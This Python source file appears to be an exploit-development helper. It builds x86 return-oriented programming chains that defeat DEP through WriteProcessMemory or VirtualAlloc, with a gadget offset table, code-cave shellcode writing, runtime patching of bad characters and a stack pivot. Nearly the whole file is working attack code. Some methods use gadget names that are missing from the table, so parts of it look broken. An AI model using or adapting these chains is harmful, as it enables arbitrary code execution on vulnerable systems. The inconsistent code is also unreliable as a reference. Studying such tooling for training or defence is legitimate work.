from typing import Iterable, Tuple
import logging
from sc_utils import RopChain

gadgets = {
    "push esp ; push eax ; pop edi ; pop esi ; ret": 0x1234,
    "push esp ; pop esi ; ret": 0x0408d6,
    "push eax ; pop esi ; ret": 0x0408dd,
    "pop ecx ; ret": 0x10c2,
    "pop eax ; ret": 0x048d5b,
    "mov dword ptr [esi], eax ; pop edi ; mov eax, esi ; pop esi ; pop ebx ; ret": 0x05039a,
    "mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010": 0x08876d,
    "mov dword ptr [esi], eax ; mov eax, esi ; pop esi ; ret": 0x422b,
    "mov dword ptr [esi], eax ; pop esi ; ret": 0x057ef6,
    "mov eax, esi ; pop esi ; ret": 0x2541,
    "mov esp, ebp ; pop ebp ; ret": 0x193e,
    "mov dword ptr [eax], ecx ; ret": 0x06c574,
    "mov eax, dword ptr [eax] ; ret": 0x01d4b4,
    "mov dword ptr [esi], eax ; ret": 0x0884de,
    "mov eax, ecx ; ret": 0x01d023,
    "inc eax ; ret": 0xbc79,
    "inc esi ; retn 0x0003": 0x3e76,
    "add eax, ecx ; ret": 0x01d0f0,
    "add byte [eax+0x00000001], bh ; ret": 0x0468ee,
    "sub eax, ecx ; pop ebx ; ret": 0x04a7b6,
    "neg eax ; ret": 0x01d8c2,
    "xchg eax, ebp ; rol bl, 0x0000005F ; xor eax, eax ; pop esi ; ret": 0x04e495,
    "xchg eax, esp ; ret": 0x05b415,
}

ROP_JUNK_VALUE = 0x41414141


class SnowCrashDEP:
    __codeCaveOffset = 0
    __dataSectonOffset = 0
    __wpmAddress = 0

    def __init__(self, exploit, badCharMap=None, dllBase=None, dataSection=None, codeCave=None, wpmAddress=None):
        self.rop = RopChain(base=dllBase)
        self.exploit = exploit
        self.badCharMap = badCharMap
        self.dllBase = dllBase or 0
        self.SetCodeCaveOffset(codeCave)
        self.SetDataSectionOffset(dataSection)
        self.SetWPMAddress(wpmAddress)

        if dataSection is not None:
            self.SetDataSectionOffset(dataSection)

        if codeCave is not None:
            self.SetCodeCaveOffset(codeCave)

        if wpmAddress is not None:
            self.SetWPMAddress(wpmAddress)

    def GetWPMAddress(self):
        return self.__wpmAddress

    def SetWPMAddress(self, wpmAddress):
        self.__wpmAddress = wpmAddress

    def SetDataSectionOffset(self, dataSection):
        self.__dataSectonOffset = dataSection

    def GetDataSectionOffset(self):
        return self.__dataSectonOffset

    def SetCodeCaveOffset(self, codeCave):
        self.__codeCaveOffset = codeCave

    def GetCodeCaveOffset(self):
        return self.__codeCaveOffset

    """
        -------------------------------
        BOOL WriteProcessMemory(
          HANDLE  hProcess,
          LPVOID  lpBaseAddress,
          LPCVOID lpBuffer,
          SIZE_T  nSize,
          SIZE_T  *lpNumberOfBytesWritten
        );
        -------------------------------
      self.rop += b""
      self.rop.append_raw(0x41414141) # WriteProcessMemory address
      self.rop.append_raw(0x42424242) # shellcode return address to return to after WriteProcessMemory is called
      self.rop.append_raw(0xffffffff) # hProcess (pseudo Process handle)
      self.rop.append_raw(0x44444444) # lpBaseAddress (Code cave address)
      self.rop.append_raw(0x45454545) # lpBuffer (shellcode stack address)
      self.rop.append_raw(0x46464646) # nSize (size of shellcode)
      self.rop.append_raw(0x47474747) # lpNumberOfBytesWritten (writable memory address, i.e. !dh -a MODULE; address just past size value +0x4)
      -------------------------------
    """

    def GetWriteProcessMemorySkeleton(self):
        self.rop += b""
        self.rop.append_raw(self.GetWPMAddress())  # WriteProcessMemory address
        # shellcode return address to return to after WriteProcessMemory is called (Code cave address)
        self.rop.append_raw(self.GetCodeCaveOffset())
        # hProcess (pseudo Process handle)
        self.rop.append_raw(self.GetCodeCaveOffset())
        # lpBaseAddress (Code cave address)
        self.rop.append_raw(0x43434343)
        # lpBuffer (shellcode stack address)
        self.rop.append_raw(0x41414141)
        self.rop.append_raw(0x42424242)  # nSize (size of shellcode)
        # lpNumberOfBytesWritten (writable memory address, i.e. !dh -a MODULE; address just past size value +0x4)
        self.rop.append_raw(self.GetDataSectionOffset())

        return len(self.rop.chain)

    def BuildRopChainWriteProcessMemoryHprocessAndLpBaseAddress(self):
        """
            because the stack gets clobbered, we need to store
            the code cave address, and move it to lpBaseAddress
            we also need to put -1 into hProcess for the current process
        """

        # get the address of our stack
        self.rop += gadgets["push esp ; pop esi ; ret"]
        self.rop += gadgets["mov eax, esi ; pop esi ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)

        # Go to hprocess on the stack
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0xffffffe8)  # -0x18
        self.rop += gadgets["add eax, ecx ; ret"]

        # get the code cave address and put it into eax
        self.rop += gadgets["push eax ; pop esi ; ret"]
        self.rop += gadgets["mov eax, dword ptr [eax] ; ret"]

        # Put clobbered lpBaseAddress address into ECX
        self.rop += gadgets["mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010"]
        self.rop.append_raw(ROP_JUNK_VALUE)  # junk value for POP ESI
        self.rop += gadgets["push eax ; pop esi ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)
        self.rop.append_raw(ROP_JUNK_VALUE)
        self.rop.append_raw(ROP_JUNK_VALUE)
        self.rop.append_raw(ROP_JUNK_VALUE)

        # Put -1 into hProcess
        self.rop += gadgets["pop eax ; ret"]
        self.rop.append_raw(0xffffffff)
        self.rop += gadgets["mov dword ptr [esi], eax ; pop edi ; mov eax, esi ; pop esi ; pop ebx ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)  # EDI
        self.rop.append_raw(ROP_JUNK_VALUE)  # ESI
        self.rop.append_raw(ROP_JUNK_VALUE)  # EBX
        # The current position of our skeleton is in EAX

        # Go to lpBaseAddress
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]

        # move the address for our code cave in ECX to lpBaseAddress
        self.rop += gadgets["push eax ; pop esi ; ret"]
        self.rop += gadgets["mov eax, ecx ; ret"]
        self.rop += gadgets["mov dword ptr [esi], eax ; pop edi ; mov eax, esi ; pop esi ; pop ebx ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)  # EDI
        self.rop.append_raw(ROP_JUNK_VALUE)  # ESI
        self.rop.append_raw(ROP_JUNK_VALUE)  # EBX

    def BuildRopChainWriteProcessMemoryLpBuffer(self):
        # Go to lpBuffer
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]

        # put address for lpBuffer into EAX
        self.rop += gadgets["push eax ; pop esi ; ret"]
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0xcafebabe)
        self.rop += gadgets["add eax, ecx ; ret"]
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0x35014742)  # 0xcafebabe + 0x35014742 = 0x200
        self.rop += gadgets["add eax, ecx ; ret"]

        self.rop += gadgets["mov dword ptr [esi], eax ; pop edi ; mov eax, esi ; pop esi ; pop ebx ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)  # EDI
        self.rop.append_raw(ROP_JUNK_VALUE)  # ESI
        self.rop.append_raw(ROP_JUNK_VALUE)  # EBX

    def BuildRopChainWriteProcessMemoryNsize(self):
        # Go to nSize param
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]

        # put nSize into a register
        self.rop += gadgets["push eax ; pop esi ; ret"]
        self.rop += gadgets["pop eax ; ret"]
        self.rop.append_raw(0xfffff9e0)
        self.rop += gadgets["neg eax ; ret"]
        self.rop += gadgets["mov dword ptr [esi], eax ; pop edi ; mov eax, esi ; pop esi ; pop ebx ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)  # EDI
        self.rop.append_raw(ROP_JUNK_VALUE)  # ESI
        self.rop.append_raw(ROP_JUNK_VALUE)  # EBX

    def RetToWriteProcessMemory(self):
        # Put the correct stack address back in eax (rop decoder changed this)
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0xffffffec)  # -0x14
        self.rop += gadgets["add eax, ecx ; ret"]
        self.rop += gadgets["xchg eax, esp ; ret"]

    def RestoreShellCode(self, eax=0x00, bh=0x11110111):
        # Make sure we have our stack offset in eax
        self.rop += gadgets["push eax ; pop esi ; ret"]

        # Add the offset of our shellcode to our current stack offset
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0xfffff795 - eax)
        self.rop += gadgets["sub eax, ecx ; pop ebx ; ret"]

        # Get bad character 0x00. From 0xff + 01 = 0x00
        self.rop.append_raw(bh)  # 01 into bh
        self.rop += gadgets["add byte [eax+0x00000001], bh ; ret"]

        # Reset stack in esi, and eax for next rop gadget
        self.rop += gadgets["mov eax, esi ; pop esi ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)
        self.rop += gadgets["push eax ; pop esi ; ret"]

    def BuildRopChainWriteProcessMemory(self, shellcode):
        skeletonLen = self.GetWriteProcessMemorySkeleton()
        self.BuildRopChainWriteProcessMemoryHprocessAndLpBaseAddress()
        self.BuildRopChainWriteProcessMemoryLpBuffer()
        self.BuildRopChainWriteProcessMemoryNsize()

        self.RestoreShellCode(eax=3, bh=0x11110111)
        self.RestoreShellCode(eax=4, bh=0x11110111)
        self.RestoreShellCode(eax=5, bh=0x11110111)
        self.RestoreShellCode(eax=17, bh=0x11110411)

        print(f"Gadget we want {hex(self.dllBase + 0x0468ee)}")

        self.RetToWriteProcessMemory()

        return (self.rop.chain, skeletonLen)

    """
        -------------------------------
        LPVOID VirtualAlloc(
          LPVOID lpAddress,
          SIZE_T dwSize,
          DWORD  flAllocationType,
          DWORD  flProtect
        );
        -------------------------------
        self.rop += b""
        self.rop.append_raw(0x41414141) # VirtualAlloc address
        self.rop.append_raw(0x42424242) # shellcode return address to return to after VirtualAlloc is called
        self.rop.append_raw(0x43434343) # lpAddress (shellcode address)
        self.rop.append_raw(0x44444444) # dwSize (0x1)
        self.rop.append_raw(0x45454545) # flAllocationType (0x1000)
        self.rop.append_raw(0x46464646) # flProtect (0x40)
        -------------------------------
    """

    def GetVirtualAllocPlaceHolder(self):
        self.rop += b""
        self.rop.append_raw(0x45454545)  # 0x14 dummy VirutalAlloc Address
        self.rop.append_raw(0x46464646)  # 0x10 Shellcode Return Address
        self.rop.append_raw(0x47474747)  # 0x0c dummy Shellcode Address
        self.rop.append_raw(0x48484848)  # 0x08 dummy dwSize
        self.rop.append_raw(0x49494949)  # 0x04 dummy flAllocationType
        self.rop.append_raw(0x51515151)  # 0x0 dummy flProtect

    def BuildRopChainVirtualAllocAddress(self):
        # get the address of our stack
        self.rop += gadgets["push esp ; push eax ; pop edi ; pop esi ; ret"]
        self.rop += gadgets["mov eax, esi ; pop esi ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)

        # set the stack offset to the start of our GetVirtualAllocPlaceHolder
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0xffffffe4)  # -0x1C
        self.rop += gadgets["add eax, ecx ; ret"]
        self.rop += gadgets["push eax ; pop esi ; ret"]

        # put the actual address of VirtualAlloc into the current offset for GetVirtualAllocPlaceHolder
        self.rop += gadgets["pop eax ; ret"]
        self.rop.append_raw(0x5054A221)  # 5054A220 + 1 VirtualAlloc
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0xffffffff)  # -1
        self.rop += gadgets["add eax, ecx ; ret"]
        self.rop += gadgets["mov eax, dword ptr [eax] ; ret"]
        self.rop += gadgets["mov dword ptr [esi], eax ; ret"]
        self.rop += gadgets["mov eax, esi ; pop esi ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)

    def BuildRopChainShellCodeRet(self):
        # increment the stack to ShellCodeRet
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]

        # put a copy of our current stack address in esi
        self.rop += gadgets["push eax ; pop esi ; ret"]

        # This is an offset of cbRopchain + n from the address of [Shellcode Return Address] on the stack.
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0xfffffea4)              # offset
        self.rop += gadgets["sub eax, ecx ; ret"]
        self.rop += gadgets["mov dword ptr [esi], eax ; ret"]
        self.rop += gadgets["add eax, ecx ; ret"]

    def BuildRopChainShellCodeAddr(self):
        # increment the stack to ShellCodeAddr
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]

        # put a copy of our current stack address in esi
        self.rop += gadgets["push eax ; pop esi ; ret"]

        # This is an offset of from where we are to the address of [Shellcode Return Address] on the stack.
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0xfffffea8)  # offset
        self.rop += gadgets["sub eax, ecx ; ret"]
        self.rop += gadgets["mov dword ptr [esi], eax ; ret"]
        self.rop += gadgets["add eax, ecx ; ret"]

    def BuildRopChainDwSize(self):
        # increment the stack to dwSize
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]

        # put a copy of our current stack address in esi
        self.rop += gadgets["push eax ; pop esi ; ret"]

        # put the value 0x1000 into our stack address dwSize
        self.rop += gadgets["pop eax ; ret"]
        self.rop.append_raw(0xffffffff)
        self.rop += gadgets["neg eax ; ret"]
        self.rop += gadgets["mov dword ptr [esi], eax ; ret"]
        self.rop += gadgets["mov eax, esi ; pop esi ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)

    def BuildRopChainFlAllocationType(self):
        # increment the stack to FlAllocationType
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]

        # put a copy of our current stack address in esi
        self.rop += gadgets["push eax ; pop esi ; ret"]

        # bp 0x50514394 ".if (@ecx & 0x0`ffffffff) = 0x41414141 {} .else {gc}"
        # put the value 0x1000 into our stack address FlAllocationType
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0xbebecebf)
        self.rop += gadgets["mov eax, ecx ; ret"]
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0x41414141)
        self.rop += gadgets["add eax, ecx ; ret"]
        self.rop += gadgets["mov dword ptr [esi], eax ; ret"]
        self.rop += gadgets["mov eax, esi ; pop esi ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)

    def BuildRopChainFlProtect(self):
        # increment the stack to FlProtec
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]

        # put a copy of our current stack address in esi
        self.rop += gadgets["push eax ; pop esi ; ret"]

        # put the value 0x40 into our stack address FlProtec
        self.rop += gadgets["pop eax ; ret"]
        self.rop.append_raw(0xffffffc0)
        self.rop += gadgets["neg eax ; ret"]
        self.rop += gadgets["mov dword ptr [esi], eax ; ret"]

    def SwapEsiEspVirtualAlloc(self):
        # Assume esi has the stack address at the end of our function call on the stack
        self.rop += gadgets["mov eax, esi ; pop esi ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0xffffffe8)  # negative offset value
        self.rop += gadgets["add eax, ecx ; ret"]
        self.rop += gadgets["xchg eax, ebp ; ret"]
        self.rop += gadgets["mov esp, ebp ; pop ebp ; ret"]

    def BuildRopChainVirtualAlloc(self):
        self.BuildRopChainVirtualAllocAddress()
        self.BuildRopChainShellCodeRet()
        self.BuildRopChainShellCodeAddr()
        self.BuildRopChainDwSize()
        self.BuildRopChainFlAllocationType()
        self.BuildRopChainFlProtect()
        self.SwapEsiEspVirtualAlloc()

        self.rop += b"\x90" * 0x24
